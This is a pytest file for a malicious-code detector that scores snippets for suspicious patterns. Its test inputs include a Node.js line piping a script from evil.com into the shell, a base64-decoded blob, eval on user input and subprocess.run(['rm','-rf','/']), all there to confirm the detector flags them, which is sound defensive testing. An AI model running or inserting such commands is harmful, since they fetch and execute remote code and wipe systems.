"""Tests for the code analyzer detector."""

import pytest

from app.ml.code_analyzer import CodeAnalyzer


@pytest.fixture
def analyzer():
    return CodeAnalyzer()


@pytest.mark.asyncio
async def test_malicious_code_flagged(analyzer):
    """Code with exec and child_process should get a high score."""
    malicious_code = """
const { exec } = require('child_process');
exec('curl http://evil.com/payload.sh | sh');
const encoded = Buffer.from('bWFsaWNpb3Vz', 'base64');
    """
    result = await analyzer.run(code=malicious_code)
    assert result.score > 30
    assert result.evidence["total_findings"] > 0


@pytest.mark.asyncio
async def test_safe_code_passes(analyzer):
    """Innocuous code should score low."""
    safe_code = """
function greet(name) {
    return 'Hello, ' + name + '!';
}
module.exports = { greet };
    """
    result = await analyzer.run(code=safe_code)
    assert result.score < 10
    assert result.evidence["total_findings"] == 0


@pytest.mark.asyncio
async def test_empty_code(analyzer):
    """No code provided should return zero score."""
    result = await analyzer.run(code="")
    assert result.score == 0.0


@pytest.mark.asyncio
async def test_python_eval_detected(analyzer):
    """Python eval() should be caught."""
    code = "result = eval(user_input)"
    result = await analyzer.run(code=code)
    assert result.score > 0
    patterns = result.evidence.get("suspicious_patterns", [])
    assert any("eval" in p.get("pattern", "").lower() or "dynamic" in p.get("pattern", "").lower() for p in patterns)


@pytest.mark.asyncio
async def test_subprocess_detected(analyzer):
    """subprocess calls should be flagged."""
    code = "import subprocess\nsubprocess.run(['rm', '-rf', '/'])"
    result = await analyzer.run(code=code)
    assert result.score > 0
